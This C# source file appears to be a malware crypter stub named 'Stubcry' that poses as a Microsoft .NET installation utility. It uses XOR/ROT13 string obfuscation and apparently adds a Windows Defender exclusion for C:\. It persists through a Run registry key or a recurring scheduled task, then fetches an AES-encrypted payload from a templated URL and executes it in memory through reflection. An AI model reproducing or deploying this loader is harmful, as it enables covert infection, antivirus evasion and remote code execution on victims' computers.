using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;



[assembly: AssemblyTitle("Installation Utility")]
[assembly: AssemblyDescription("Microsoft .NET Services Installation Utility")]
[assembly: AssemblyCompany("Microsoft® .NET Framework")]
[assembly: AssemblyProduct("Microsoft Corporation")]
[assembly: AssemblyCopyright("© Microsoft Corporation.  All rights reserved.")]
[assembly: AssemblyTrademark("")]


namespace Stubcry
{

    static class Program
    {


        public static byte[] FOKFILE(string base64Cipher, string base64Key, string base64IV)
        {
            byte[] cipherBytes = Convert.FromBase64String(base64Cipher);
            byte[] key = Convert.FromBase64String(base64Key);
            byte[] iv = Convert.FromBase64String(base64IV);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherBytes))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            byte[] buffer = new byte[1024];
                            int readBytes;
                            while ((readBytes = csDecrypt.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                msPlain.Write(buffer, 0, readBytes);
                            }
                            byte[] plainBytes = msPlain.ToArray();
                            return plainBytes;
                        }
                    }
                }
            }
        }
        static void NIKFELSTART(string servicename)
        {

            Microsoft.Win32.RegistryKey HELPER = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(FOKSTRING(@"N1o8DA4FNS1BOxpGAEBXBB9jBVMfJhwWIB4KVQoyCQUmO1ITD1MEXFgGBFEf", "V2yPogCK$IS!a22aw3Y5uDmwVT"), true);
            HELPER.SetValue(servicename, config.fullpath);
            HELPER.Dispose();
            HELPER.Close();
        }
        static void Taskzebi(string servicename, int minutes)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = FOKSTRING("JFkLfgkfJSVDPCNH", "V2yPogCK$IS!a22aw3Y5uDmwVT"),
                    CreateNoWindow = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "/create /sc MINUTE /mo " + minutes + " /tn \"" + servicename + "\" /tr \"" + config.folder + "\\" + config.FileName + "\" /f"

                };
                Process.Start(startInfo);
            }
            catch
            {

            }
        }
        public static void jibzok(byte[] zebizebi)
        {
            try
            {
                Assembly jib = null;

                for (int i = 0; i < zebizebi.Length; i++)
                {
                    if (zebizebi[i] == 0x4d && zebizebi[i + 1] == 0x5a)
                    {
                        jib = Assembly.Load(zebizebi);
                        break;
                    }
                }

                if (jib != null)
                {
                    MethodInfo enter = jib.EntryPoint;

                    if (enter.ReturnType == typeof(void))
                    {
                        enter.Invoke(null, null);
                    }
                    else
                    {
                        object gas = enter.Invoke(null, null);
                    }
                }
            }
            catch
            {
            }
        }


        static void MCHHNE(string destinationDirectory, string newName)
        {
            string setupsoftware = System.Reflection.Assembly.GetEntryAssembly().Location;
            string wheretogo = Path.Combine(destinationDirectory, newName);

            File.Copy(setupsoftware, wheretogo, true);
        }

        static string FOKSTRING(string encrypted, string key)
        {
            List<byte> bytes = Convert.FromBase64String(encrypted).ToList();
            string MAKLOUB = "";
            for (int i = 0; i < bytes.Count; i++)
            {
                int c = bytes[i] ^ key[(i % key.Length)];
                MAKLOUB += Convert.ToChar(c);
            }

            string KAYSAR = new string(MAKLOUB.Reverse().ToArray());

            string message = "";
            for (int i = 0; i < KAYSAR.Length; i++)
            {
                int c = KAYSAR[i];
                if ((c >= 65 && c <= 77) || (c >= 97 && c <= 109))
                {
                    c += 13;
                }
                else if ((c >= 78 && c <= 90) || (c >= 110 && c <= 122))
                {
                    c -= 13;
                }
                message += Convert.ToChar(c);
            }

            return message;
        }
        public static string SendGetRequest(string url)
        {
            string result = string.Empty;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream stream = response.GetResponseStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        result = reader.ReadToEnd();
                    }
                }
            }

            return result;
        }
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (config.issleep == true)
            {
                Thread.Sleep(config.sleeptime);
            }
            if (config.isexcludewd == true && config.fullpath != config.ePath)
            {
                string[] Sakerdef = new string[] { FOKSTRING("GFMvLFIoOTIOK1AfTkUXOw==", "j#N^7ZJ@kh3Ec4fu"), FOKSTRING("H0QgHVY4PCYDEUMuMRk=", "j#N^7ZJ@kh3Ec4fu"), "C:\\" };

                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = FOKSTRING("GEg8cE4jODUtDUEvAXc=", "j#N^7ZJ@kh3Ec4fu");
                psi.Arguments = string.Join(" ", Sakerdef);
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.Verb = FOKSTRING("DE0vNlI=", "j#N^7ZJ@kh3Ec4fu");

                try
                {
                    Process.Start(psi);
                }
                catch
                {

                }

            }
            if (!Directory.Exists(config.folder) && config.ispersist == true)
            {
                Directory.CreateDirectory(config.folder);
                MCHHNE(config.folder, config.FileName);

            }
            else if (!File.Exists(config.fullpath) && config.ispersist == true)
            {
                MCHHNE(config.folder, config.FileName);

            }

            if (config.ispersist == true && config.istartup == true)
            {
                NIKFELSTART(config.servicename);
            }
            else if (config.ispersist == true && config.istask == true)
            {
                Taskzebi(config.servicename, config.taskm);
            }
            List<char> code = SendGetRequest("$URL").ToList();
            code.Reverse();

            string magicalcode = new string(code.ToArray()).Replace(",", "").Replace("'", "");
            jibzok(FOKFILE(magicalcode, "$key", "$IV"));


        }
    }
}
